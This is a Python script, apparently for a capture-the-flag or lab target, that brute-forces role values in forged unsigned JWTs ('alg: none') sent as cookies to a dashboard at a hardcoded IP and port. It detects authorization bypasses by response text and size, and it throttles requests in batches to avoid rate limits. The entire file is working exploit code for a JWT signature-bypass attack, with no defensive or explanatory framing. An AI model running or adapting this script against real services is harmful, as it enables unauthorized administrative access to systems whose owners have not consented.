import requests
import base64
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# --- CONFIGURATION ---
TARGET_URL = "http://34.100.175.35:30302/dashboard"
WORDLIST_PATH = "wordlists/common_roles.txt"
THREADS = 3
TIMEOUT = 7 

# --- THROTTLING CONFIG ---
BATCH_SIZE = 100   # Send X requests...
SLEEP_TIME = 300    # ...then wait Y seconds (60s = 1 minute)

# Your Custom Logic
FAIL_STRING = "Access denied: invalid admin token"
# FAIL_SIZES = {10382, 10675, 10948, 11221}
FAIL_LOWER_SIZE = 6100
FAIL_UPPER_SIZE = 6150

USE_PROXIES = True
PROXIES = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

JWT_HEADER = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"

def get_configured_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[502, 503, 504],
        allowed_methods=["GET"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    if USE_PROXIES:
        session.proxies.update(PROXIES)
        session.verify = False 
        
    return session

def b64_encode(payload_dict):
    json_str = json.dumps(payload_dict, separators=(',', ':'))
    encoded = base64.urlsafe_b64encode(json_str.encode()).decode()
    return encoded.replace("=", "")

def test_role(role, session):
    role = role.strip()
    if not role: return None
    payload = {"sub": "notatypicalsysadmin", "role": role}
    jwt_token = f"{JWT_HEADER}.{b64_encode(payload)}."
    
    try:
        resp = session.get(
            TARGET_URL, 
            cookies={"access_token_cookie": jwt_token}, 
            timeout=TIMEOUT, 
            allow_redirects=True,
            headers={
                'Connection': 'close'
            }
        )
        
        if resp.status_code not in [502, 503, 504]:
            if (FAIL_STRING not in resp.text) and not (FAIL_LOWER_SIZE <= len(resp.content) <= FAIL_UPPER_SIZE):
                return {
                    "hit": True, 
                    "role": role, 
                    "status": resp.status_code, 
                    "len": len(resp.content), 
                    "token": jwt_token
                }
    except Exception:
        pass
    return {"hit": False, "role": role}

def main():
    if USE_PROXIES:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    try:
        with open(WORDLIST_PATH, 'r') as f:
            roles = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Error: '{WORDLIST_PATH}' not found.")
        return

    session = get_configured_session()
    hits = []
    
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Throttling: Sending {BATCH_SIZE} reqs then sleeping {SLEEP_TIME}s")

    # Split wordlist into batches
    batches = [roles[i:i + BATCH_SIZE] for i in range(0, len(roles), BATCH_SIZE)]

    with tqdm(total=len(roles), unit="req", desc="Fuzzing", colour="green") as pbar:
        for i, batch in enumerate(batches):
            with ThreadPoolExecutor(max_workers=THREADS) as executor:
                future_to_role = {executor.submit(test_role, r, session): r for r in batch}
                
                for future in as_completed(future_to_role):
                    res = future.result()
                    if res and res.get("hit"):
                        hits.append(res)
                        tqdm.write(f"\n[!] HIT: {res['role']} (Status: {res['status']} | Length: {res['len']})")
                        tqdm.write(f"    JWT: {res['token']}\n")
                    pbar.update(1)
            
            # If not the last batch, sleep to let the connection/router cool down
            if i < len(batches) - 1:
                tqdm.write(f"[*] Batch {i+1} complete. Cooling down for {SLEEP_TIME}s...")
                time.sleep(SLEEP_TIME)

    print("\n" + "="*60)
    print(f"{'ROLE':<20} | {'STATUS':<8} | {'SIZE':<10}")
    print("-" * 60)
    for h in hits:
        print(f"{h['role']:<20} | {h['status']:<8} | {h['len']:<10}")
    print("="*60)

if __name__ == "__main__":
    main()